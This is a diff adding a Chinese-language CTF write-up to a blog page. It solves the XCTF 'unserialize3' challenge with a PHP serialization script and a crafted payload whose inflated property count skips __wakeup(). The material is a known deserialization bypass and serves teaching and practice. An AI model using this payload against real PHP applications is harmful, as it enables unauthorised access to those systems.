@@ -71,6 +71,23 @@
 <p>/c7be9/ ———- 中间匹配</p>
 <p>构造字符串e <strong>be0f233ac7be98aa</strong></p>
 <p>然后在输入框中输入即可获得flag</p>
+<h1 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h1><p>class xctf{<br>public $flag = ‘111’;<br>public function __wakeup(){<br>exit(‘bad requests’);<br>}<br>?code=</p>
+<p>exit()这个函数和die()这个函数差不多，输出一条脚本之后，就退出当前脚本。当然不能让他退出呀，想办法让他绕过wakeup(),这个函数。</p>
+<?php
+class xctf{
+public $flag = '111';
+public function __wakeup(){
+exit('bad requests');
+}
+}
+$c=new xctf();
+printf(serialize($c));
+?>
+
+<p>O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}</p>
+<p>绕过后O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
+<p>？code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
+<p>获得flag</p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
